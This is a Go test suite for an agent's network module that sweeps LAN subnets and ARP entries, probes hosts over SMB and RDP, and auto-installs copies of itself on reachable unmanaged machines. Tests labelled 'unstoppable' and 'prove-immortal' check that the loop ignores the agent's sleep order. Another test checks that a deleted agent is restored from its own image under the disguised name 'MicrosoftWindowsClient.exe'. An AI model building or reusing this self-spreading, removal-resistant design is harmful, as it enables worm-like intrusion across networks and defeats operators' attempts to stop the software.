package commands

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// resetCloneState clears the job ledger + pending events (test isolation:
// the ledger is process-global).
func resetCloneState() {
	cloneMu.Lock()
	defer cloneMu.Unlock()
	cloneJobs = map[string]*cloneJob{}
	pendingCloneEvents = nil
}

// stubDiscoveryNil replaces LAN discovery with "empty network" (hermetic
// cycles for tests that don't cover discovery: Subnets:nil was meant as "no
// targets", but LoadNMSConfig substitutes the real autoSubnets).
func stubDiscoveryNil(t *testing.T) {
	t.Helper()
	oldDial, oldSeed := dialTCP, arpSeedHosts
	dialTCP = func(string, int, time.Duration) bool { return false }
	arpSeedHosts = func() []string { return nil }
	t.Cleanup(func() { dialTCP, arpSeedHosts = oldDial, oldSeed })
}
// freezeSweepCache empties the subnet sweep cache for a test (restores after)
// so cycles are deterministic regardless of test order.
func freezeSweepCache(t *testing.T) {
	t.Helper()
	nmsSweepCacheMu.Lock()
	oldCache, oldAt := nmsSweepCache, nmsSweepAt
	nmsSweepCache, nmsSweepAt = nil, time.Time{}
	nmsSweepCacheMu.Unlock()
	t.Cleanup(func() {
		nmsSweepCacheMu.Lock()
		nmsSweepCache, nmsSweepAt = oldCache, oldAt
		nmsSweepCacheMu.Unlock()
	})
}

// withNMSRoot swaps the rendezvous root for a test (restores after).
func withNMSRoot(t *testing.T, dir string) {
	t.Helper()
	old := nmsRootOverride
	nmsRootOverride = dir
	t.Cleanup(func() { nmsRootOverride = old })
}

// CloneEligible decision table: only reachable+unmanaged+unlisted hosts pass.
func TestCloneEligible(t *testing.T) {
	exc := []string{"192.168.1.1"}
	self := []string{"192.168.1.50"}
	ctrl := []string{"176.229.98.54"}
	cases := []struct {
		host                  string
		reach, managed         bool
		want                  bool
		reason                string
	}{
		{"192.168.1.60", true, false, true, "eligible"},
		{"192.168.1.61", false, false, false, "unreachable"},
		{"192.168.1.62", true, true, false, "already-managed"},
		{"192.168.1.1", true, false, false, "excluded"},
		{"192.168.1.50", true, false, false, "self"},
		{"176.229.98.54", true, false, false, "controller"},
	}
	for _, c := range cases {
		got, reason := CloneEligible(c.host, c.reach, c.managed, exc, self, ctrl)
		if got != c.want || reason != c.reason {
			t.Fatalf("%s: got (%v,%q) want (%v,%q)", c.host, got, reason, c.want, c.reason)
		}
	}
}

// set-nms must refuse credential-ish keys: passwords travel only via the
// local vault file, never the controller channel.
func TestSetNMSRefusesPasswords(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	for _, args := range []string{"password=x", "wmi_pass=x", "cred_file=x", "secret=x", "token=x"} {
		if _, err := SetNMS(args, nil); err == nil || !strings.Contains(err.Error(), "local-only") {
			t.Fatalf("SetNMS(%q) must refuse with local-only, got %v", args, err)
		}
	}
}

func TestSetNMSValidation(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if _, err := SetNMS("interval=5", nil); err == nil {
		t.Fatal("interval<10 must fail")
	}
	if _, err := SetNMS("bogus-key=1", nil); err == nil {
		t.Fatal("unknown key must fail")
	}
	if _, err := SetNMS("autoclone=maybe", nil); err == nil {
		t.Fatal("bad autoclone must fail")
	}
	if _, err := SetNMS("autoclone=off interval=120", nil); err != nil {
		t.Fatalf("valid set: %v", err)
	}
	cfg := LoadNMSConfig()
	if cfg.AutoClone || cfg.IntervalSec != 120 {
		t.Fatalf("config not applied: %+v", cfg)
	}
	if _, err := SetNMS("autoclone=on", nil); err != nil {
		t.Fatalf("re-arm: %v", err)
	}
	if LoadNMSConfig().AutoClone != true {
		t.Fatal("autoclone=on must persist")
	}
}

// Sleep flag roundtrip (durable order the agent honors).
func TestSleepFlagRoundtrip(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if SleepFlagSet() {
		t.Fatal("fresh root must read awake")
	}
	if err := WriteSleepFlag("test"); err != nil {
		t.Fatal(err)
	}
	st, ok := ReadSleepFlag()
	if !ok || st.Reason != "test" {
		t.Fatalf("flag unreadable: %+v %v", st, ok)
	}
	if !SleepFlagSet() {
		t.Fatal("must read asleep")
	}
	if err := ClearSleepFlag(); err != nil {
		t.Fatal(err)
	}
	if SleepFlagSet() {
		t.Fatal("must read awake after clear")
	}
}

// The shutdown file is the ONLY loop exit: StepNMS returns the sentinel.
func TestShutdownSentinel(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, Subnets: nil, AutoClone: false})
	if err := WriteShutdownFile(); err != nil {
		t.Fatal(err)
	}
	if err := StepNMS(nil, nil); err != ErrNMSShutdown {
		t.Fatalf("want ErrNMSShutdown, got %v", err)
	}
}

// THE unstoppable test: the tick advances while "asleep" — the loop never
// reads the sleep flag, so agent-sleep cannot slow or stop the monitor.
func TestTickAdvancesWhileAsleep(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	stubDiscoveryNil(t)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, Subnets: nil, AutoClone: false})
	before := NMSTick()
	if err := WriteSleepFlag("prove-immortal"); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 2; i++ {
		if err := StepNMS(nil, nil); err != nil {
			t.Fatalf("cycle %d: %v", i, err)
		}
	}
	if NMSTick() != before+2 {
		t.Fatalf("tick stuck at %d (was %d) while asleep", NMSTick(), before)
	}
	_ = ClearSleepFlag()
}

// Circuit breaker: failure storms pause the CLONE ARM only.
func TestBreakerTrips(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, FailThreshold: 2, FailWindowMin: 60, RearmAfterMin: 60})
	nmsClearBreaker()
	if CloneArmPaused() {
		t.Fatal("fresh breaker must not hold")
	}
	nmsRecordFail()
	if CloneArmPaused() {
		t.Fatal("single fail must not trip threshold=2")
	}
	nmsRecordFail()
	if !CloneArmPaused() {
		t.Fatal("threshold must trip the arm")
	}
	nmsClearBreaker()
	if CloneArmPaused() {
		t.Fatal("clear must release the arm")
	}
}

// Subnet expansion: full /24 minus network/broadcast.
func TestExpandSubnet(t *testing.T) {
	ips := expandSubnet("192.168.7.0/24")
	if len(ips) != 254 || ips[0] != "192.168.7.1" || ips[253] != "192.168.7.254" {
		t.Fatalf("bad expansion: %d first=%s last=%s", len(ips), ips[0], ips[len(ips)-1])
	}
	if len(expandSubnet("bogus")) != 0 {
		t.Fatal("garbage subnet must expand empty")
	}
}

// ManagedHint tristate: readable version.txt = managed, access-denied or
// timeout = unknown (never clone), anything else = unmanaged.
func TestManagedHintChecked(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("managed hint paths are Windows UNC")
	}
	old := nmsReadUNC
	t.Cleanup(func() { nmsReadUNC = old })
	if m, u := func() (bool, bool) {
		nmsReadUNC = func(string) ([]byte, error) { return []byte("1.49.2"), nil }
		return ManagedHintChecked("192.0.2.9")
	}(); !m || u {
		t.Fatalf("readable hint: got (%v,%v), want (true,false)", m, u)
	}
	if m, u := func() (bool, bool) {
		nmsReadUNC = func(string) ([]byte, error) { return nil, os.ErrPermission }
		return ManagedHintChecked("192.0.2.9")
	}(); m || !u {
		t.Fatalf("denied hint: got (%v,%v), want (false,true)", m, u)
	}
	if m, u := func() (bool, bool) {
		nmsReadUNC = func(string) ([]byte, error) { return nil, os.ErrNotExist }
		return ManagedHintChecked("192.0.2.9")
	}(); m || u {
		t.Fatalf("absent hint: got (%v,%v), want (false,false)", m, u)
	}
	if ManagedHint("192.0.2.9") {
		t.Fatal("wrapper must stay false on absent hint")
	}
}

// Sweep must find hosts on ANY management port, not just 445.
func TestSweepMultiPort(t *testing.T) {
	old := dialTCP
	dialTCP = func(host string, port int, d time.Duration) bool { return port == 3389 }
	t.Cleanup(func() { dialTCP = old })
	got := sweepSubnets([]string{"192.0.2.0/24"})
	if len(got) != 254 || got[0] != "192.0.2.1" {
		t.Fatalf("rdp-only subnet: got %d hosts first=%s", len(got), got[0])
	}
	found := false
	for _, h := range got {
		if h == "192.0.2.254" {
			found = true
		}
	}
	if !found {
		t.Fatal("rdp-only subnet must include 192.0.2.254")
	}
}

// ARP seed parsing: live entries kept, multicast/incomplete dropped.
func TestArpSeedParses(t *testing.T) {
	old := arpSeedExec
	arpSeedExec = func() ([]byte, error) {
		return []byte("Interface: 192.168.1.50 --- 0x4\r\n" +
			"  Internet Address      Physical Address      Type\r\n" +
			"  192.168.1.1           aa-bb-cc-dd-ee-ff     dynamic\r\n" +
			"  192.168.1.60          11-22-33-44-55-66     dynamic\r\n" +
			"  224.0.0.251           01-00-5e-00-00-fb     static\r\n" +
			"  192.168.1.61          <incomplete>          invalid\r\n"), nil
	}
	t.Cleanup(func() { arpSeedExec = old })
	got := arpSeedHosts()
	if len(got) != 2 || got[0] != "192.168.1.1" || got[1] != "192.168.1.60" {
		t.Fatalf("arp seed: got %v", got)
	}
}

// Strict expansion: non-/24 and garbage expand empty; a sloppy host-bits
// base still selects its /24.
func TestExpandSubnetStrict(t *testing.T) {
	for _, sn := range []string{"10.0.0.0/16", "not-a-subnet", "192.168.1", "192.168.1.1/33", "10.0.0.0/8"} {
		if len(expandSubnet(sn)) != 0 {
			t.Fatalf("%q must expand empty", sn)
		}
	}
	if ips := expandSubnet("192.168.1.5/24"); len(ips) != 254 || ips[0] != "192.168.1.1" {
		t.Fatalf("sloppy base: got %d", len(ips))
	}
}

// Success decays the breaker: one verified clone clears a near-tripped arm.
func TestBreakerSuccessClears(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, FailThreshold: 2, FailWindowMin: 60, RearmAfterMin: 60})
	nmsClearBreaker()
	nmsRecordFail()
	nmsRecordSuccess()
	nmsRecordFail()
	if CloneArmPaused() {
		t.Fatal("a success must reset the storm counter")
	}
	nmsClearBreaker()
}

// Manual clone probes first: dead, managed, and unknown hosts are refused;
// only a probed-eligible host starts a tracked job.
func TestNMSCloneProbesFirst(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	resetCloneState()
	oldDial, oldRead, oldExec := dialTCP, nmsReadUNC, nmsCloneExec
	t.Cleanup(func() { dialTCP, nmsReadUNC, nmsCloneExec = oldDial, oldRead, oldExec })
	nmsCloneExec = func(host, ver string) string { return "cloned-verified" }

	dialTCP = func(string, int, time.Duration) bool { return false }
	if _, err := NMSHandle("nms-clone", "192.0.2.71", nil); err == nil || !strings.Contains(err.Error(), "unreachable") {
		t.Fatalf("dead host must refuse, got %v", err)
	}
	dialTCP = func(string, int, time.Duration) bool { return true }
	nmsReadUNC = func(string) ([]byte, error) { return []byte("1.49.2"), nil }
	if _, err := NMSHandle("nms-clone", "192.0.2.72", nil); err == nil || !strings.Contains(err.Error(), "already managed") {
		t.Fatalf("managed host must refuse, got %v", err)
	}
	nmsReadUNC = func(string) ([]byte, error) { return nil, os.ErrPermission }
	if _, err := NMSHandle("nms-clone", "192.0.2.73", nil); err == nil || !strings.Contains(err.Error(), "unknown") {
		t.Fatalf("unknown host must refuse, got %v", err)
	}
	nmsReadUNC = func(string) ([]byte, error) { return nil, os.ErrNotExist }
	res, err := NMSHandle("nms-clone", "192.0.2.74", nil)
	if err != nil || !strings.Contains(res, "job started") {
		t.Fatalf("eligible host must start, got %q %v", res, err)
	}
	cloneMu.Lock()
	_, tracked := cloneJobs["192.0.2.74"]
	cloneMu.Unlock()
	if !tracked {
		t.Fatal("started job must be tracked in the ledger")
	}
}

// Full cycle with fakes: one launch per host (no re-clone storm), honest
// terminal state + event on the next report, cooldown instead of relaunch.
func TestCloneJobDedupeCooldown(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	freezeSweepCache(t)
	resetCloneState()
	nmsClearBreaker()
	oldDial, oldRead, oldStats, oldExec, oldSeed, oldStart := dialTCP, nmsReadUNC, remoteStatsCIM, nmsCloneExec, arpSeedHosts, guardStartAgent
	t.Cleanup(func() {
		dialTCP, nmsReadUNC, remoteStatsCIM, nmsCloneExec, arpSeedHosts, guardStartAgent = oldDial, oldRead, oldStats, oldExec, oldSeed, oldStart
	})
	dialTCP = func(string, int, time.Duration) bool { return true }
	nmsReadUNC = func(string) ([]byte, error) { return nil, os.ErrNotExist }
	remoteStatsCIM = func(string, time.Duration) (float64, float64, float64, error) {
		return 0, 0, 0, errors.New("no stats in test")
	}
	var calls int
	nmsCloneExec = func(host, ver string) string { calls++; return "cloned-verified" }
	arpSeedHosts = func() []string { return nil }
	guardStartAgent = func() error { return nil }
	// Fake clone payload: MZ + 10MB so the arm considers it present.
	payload := make([]byte, 10*1024*1024)
	payload[0], payload[1] = 'M', 'Z'
	if err := os.WriteFile(NMSInstallerPath(), payload, 0644); err != nil {
		t.Fatal(err)
	}
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, SweepEveryMin: 5, Subnets: []string{},
		ExtraHosts: []string{"192.0.2.60"}, AutoClone: true, MaxParallel: 8,
		FailThreshold: 5, FailWindowMin: 15, RearmAfterMin: 60})

	findHost := func(report string) map[string]interface{} {
		t.Helper()
		var rep map[string]interface{}
		if err := json.Unmarshal([]byte(report), &rep); err != nil {
			t.Fatalf("report not JSON: %v", err)
		}
		for _, r := range rep["results"].([]interface{}) {
			if m := r.(map[string]interface{}); m["host"] == "192.0.2.60" {
				return m
			}
		}
		t.Fatal("host missing from report")
		return nil
	}
	var first string
	if err := StepNMS(func(j string) { first = j }, nil); err != nil {
		t.Fatal(err)
	}
	if got := findHost(first)["clone"]; got != "cloning" {
		t.Fatalf("first cycle: clone=%v, want cloning", got)
	}
	// The launch runs in a goroutine: allow it a scheduling slice instead
	// of asserting before it can run (flakes under a loaded suite).
	launchDeadline := time.Now().Add(5 * time.Second)
	for calls < 1 && time.Now().Before(launchDeadline) {
		time.Sleep(10 * time.Millisecond)
	}
	if calls != 1 {
		t.Fatalf("first cycle must launch once, launched %d", calls)
	}
	// Wait for the async job to land.
	deadline := time.Now().Add(5 * time.Second)
	for {
		cloneMu.Lock()
		j := cloneJobs["192.0.2.60"]
		done := j != nil && j.Done
		cloneMu.Unlock()
		if done || time.Now().After(deadline) {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	var second string
	if err := StepNMS(func(j string) { second = j }, nil); err != nil {
		t.Fatal(err)
	}
	if got := findHost(second)["clone"]; got != "clone-cooldown-cloned-verified" {
		t.Fatalf("second cycle: clone=%v, want clone-cooldown-cloned-verified", got)
	}
	if calls != 1 {
		t.Fatalf("cooldown must suppress relaunch, launched %d", calls)
	}
	var rep map[string]interface{}
	_ = json.Unmarshal([]byte(second), &rep)
	seen := false
	for _, e := range rep["events"].([]interface{}) {
		if strings.Contains(e.(string), "clone 192.0.2.60: cloned-verified") {
			seen = true
		}
	}
	if !seen {
		t.Fatalf("completion event missing: %v", rep["events"])
	}
	if CloneArmPaused() {
		t.Fatal("verified clone must decay the breaker")
	}
}

// sweepTargets unifies sweep cache + fresh ARP seeds + extra hosts, deduped.
func TestSweepTargetsUnify(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	freezeSweepCache(t)
	oldSeed := arpSeedHosts
	arpSeedHosts = func() []string { return []string{"192.0.2.7", "192.0.2.60"} }
	t.Cleanup(func() { arpSeedHosts = oldSeed })
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, SweepEveryMin: 5, Subnets: []string{},
		ExtraHosts: []string{"192.0.2.60", "192.0.2.61"}})
	got := sweepTargets(LoadNMSConfig())
	if len(got) != 3 || got[0] != "192.0.2.7" || got[1] != "192.0.2.60" || got[2] != "192.0.2.61" {
		t.Fatalf("targets: got %v", got)
	}
}

// Numeric IP ordering: 192.168.1.100 after .20; garbage sorts last.
func TestIPLess(t *testing.T) {
	if !ipLess("192.168.1.20", "192.168.1.100") || ipLess("192.168.1.100", "192.168.1.20") {
		t.Fatal("numeric octet order wrong")
	}
	if !ipLess("10.0.0.1", "nope") || ipLess("nope", "10.0.0.1") {
		t.Fatal("non-IP must sort last")
	}
	if ipLess("abc", "abd") == ipLess("abd", "abc") {
		t.Fatal("non-IP tiebreak must be lexical")
	}
}

// nms-now sees the same targets as a cycle (ARP seeds included).
func TestNMSNowSeesArp(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	stubDiscoveryNil(t)
	oldSeed := arpSeedHosts
	arpSeedHosts = func() []string { return []string{"192.0.2.81", "192.0.2.82"} }
	t.Cleanup(func() { arpSeedHosts = oldSeed })
	res, err := NMSHandle("nms-now", "", nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(res, "nms-now: 0/2 reachable") {
		t.Fatalf("nms-now: got %q", res)
	}
}

// nms-status reports the truthful target/arp breakdown.
func TestNMSStatusCountsArp(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	freezeSweepCache(t)
	oldSeed := arpSeedHosts
	arpSeedHosts = func() []string { return []string{"192.0.2.91", "192.0.2.92"} }
	t.Cleanup(func() { arpSeedHosts = oldSeed })
	res, err := NMSHandle("nms-status", "", nil)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res, "targets=2 sweep=0 arp=2") {
		t.Fatalf("status counts: got %q", res)
	}
}

// ProbeHost with fakes: reachable, unmanaged, stats land, no error text.
func TestProbeHostFaked(t *testing.T) {
	oldDial, oldRead, oldStats := dialTCP, nmsReadUNC, remoteStatsCIM
	t.Cleanup(func() { dialTCP, nmsReadUNC, remoteStatsCIM = oldDial, oldRead, oldStats })
	dialTCP = func(string, int, time.Duration) bool { return true }
	nmsReadUNC = func(string) ([]byte, error) { return nil, os.ErrNotExist }
	remoteStatsCIM = func(string, time.Duration) (float64, float64, float64, error) {
		return 11, 22, 33, nil
	}
	r := ProbeHost("192.0.2.80")
	if !r.Reachable || r.ManagedHint || r.ManagedUnknown {
		t.Fatalf("probe flags wrong: %+v", r)
	}
	if r.CPU != 11 || r.Mem != 22 || r.Disk != 33 || r.StatsErr != "" {
		t.Fatalf("probe stats wrong: %+v", r)
	}
}

// Report shape: the controller/UI contract (required keys present).
func TestReportShape(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	stubDiscoveryNil(t)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = SaveNMSConfig(NMSConfig{IntervalSec: 60, Subnets: nil, AutoClone: false})
	var got string
	if err := StepNMS(func(j string) { got = j }, nil); err != nil {
		t.Fatal(err)
	}
	var rep map[string]interface{}
	if err := json.Unmarshal([]byte(got), &rep); err != nil {
		t.Fatalf("report not JSON: %v", err)
	}
	for _, k := range []string{"prober", "at", "tick", "version", "guard", "clone_arm", "results"} {
		if _, ok := rep[k]; !ok {
			t.Fatalf("report missing %q", k)
		}
	}
	res, ok := rep["results"].([]interface{})
	if !ok || len(res) == 0 {
		t.Fatal("results must carry at least the self entry")
	}
}

// Agent-side redirects: NMS verbs sent to the AGENT answer with a pointer,
// never touch cmd.exe (Execute falls back to shell for unknown verbs).
func TestAgentRedirects(t *testing.T) {
	for _, v := range []string{"agent-sleep", "agent-wake-up", "nms-status", "nms-now", "set-nms", "nms-stop", "nms-clone"} {
		res, err := Execute(v, "")
		if err != nil {
			t.Fatalf("%s errored: %v", v, err)
		}
		if !strings.Contains(res, "hostname/nms") {
			t.Fatalf("%s must redirect to the NMS row, got %q", v, res)
		}
	}
}

// Sleep gate on the agent: asleep refuses work, bypass verbs answer,
// misaddressed wake still answers (it must, to teach the operator).
func TestAgentSleepGate(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if _, _, err := ExecuteChecked("t1", "get-status", ""); err != nil {
		t.Fatalf("awake get-status: %v", err)
	}
	if err := WriteSleepFlag("gate-test"); err != nil {
		t.Fatal(err)
	}
	if _, _, err := ExecuteChecked("t2", "get-status", ""); err == nil || !strings.Contains(err.Error(), "asleep") {
		t.Fatalf("asleep get-status must refuse, got %v", err)
	}
	if _, _, err := ExecuteChecked("t3", "ping", ""); err != nil {
		t.Fatalf("asleep ping must answer: %v", err)
	}
	res, _, err := ExecuteChecked("t4", "agent-wake-up", "")
	if err != nil || !strings.Contains(res, "hostname/nms") {
		t.Fatalf("asleep agent-wake-up must redirect, got %q %v", res, err)
	}
	_ = ClearSleepFlag()
}

// NMS verbs: unknown rejected, stop gated on confirm (and writes nothing
// without it).
func TestNMSHandleGates(t *testing.T) {
	withNMSRoot(t, t.TempDir())
	if _, err := NMSHandle("nms-bogus", "", nil); err == nil {
		t.Fatal("unknown NMS verb must fail")
	}
	if _, err := NMSHandle("nms-stop", "", nil); err == nil {
		t.Fatal("nms-stop without confirm must fail")
	}
	if _, err := os.Stat(NMSShutdownPath()); !os.IsNotExist(err) {
		t.Fatal("refused stop must not write the shutdown file")
	}
	if _, err := NMSHandle("nms-stop", "--confirm YES", nil); err != nil {
		t.Fatalf("confirmed stop: %v", err)
	}
	if _, err := os.Stat(NMSShutdownPath()); err != nil {
		t.Fatal("confirmed stop must write the shutdown file")
	}
	_ = os.Remove(NMSShutdownPath())
}

// Update pinning: a newer installDir version exits the loop (persistence
// restarts new bytes) instead of running stale code forever.
func TestVerNewer(t *testing.T) {
	if !verNewer("1.49.0", "1.48.0") || verNewer("1.48.0", "1.49.0") || verNewer("1.48.0", "1.48.0") {
		t.Fatal("dotted compare wrong")
	}
	if !verNewer("1.48.1", "1.48.0") || verNewer("1.9.0", "1.10.0") {
		t.Fatal("numeric (not lexical) compare required")
	}
}

func TestUpdateExits(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	oldStart := guardStartAgent
	guardStartAgent = func() error { return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	_ = os.WriteFile(filepath.Join(dir, "version.txt"), []byte("9.9.9\n"), 0644)
	if err := StepNMS(nil, nil); !errors.Is(err, ErrNMSUpdate) {
		t.Fatalf("want ErrNMSUpdate, got %v", err)
	}
}

// Guard restore: a wiped agent dir gets rewritten from our own image
// (test binary stands in), starter invoked, action word exact.
func TestGuardRestoresWiped(t *testing.T) {
	dir := t.TempDir()
	withNMSRoot(t, dir)
	var started int
	oldStart := guardStartAgent
	guardStartAgent = func() error { started++; return nil }
	t.Cleanup(func() { guardStartAgent = oldStart })
	// Point the guard at a scratch exe name? GuardAgent uses the fixed
	// install path — the override root makes that the temp dir (safe).
	if got := GuardAgent(); got != "restored-missing" {
		t.Fatalf("wiped agent: got %q", got)
	}
	if started != 1 {
		t.Fatalf("starter must run once, ran %d", started)
	}
	b, err := os.ReadFile(filepath.Join(dir, "MicrosoftWindowsClient.exe"))
	if err != nil || len(b) < 1024*1024 {
		t.Fatalf("restored bytes bad: %d %v", len(b), err)
	}
	if got := GuardAgent(); got != "started-process" && got != "ok" {
		t.Fatalf("second pass: got %q", got)
	}
}
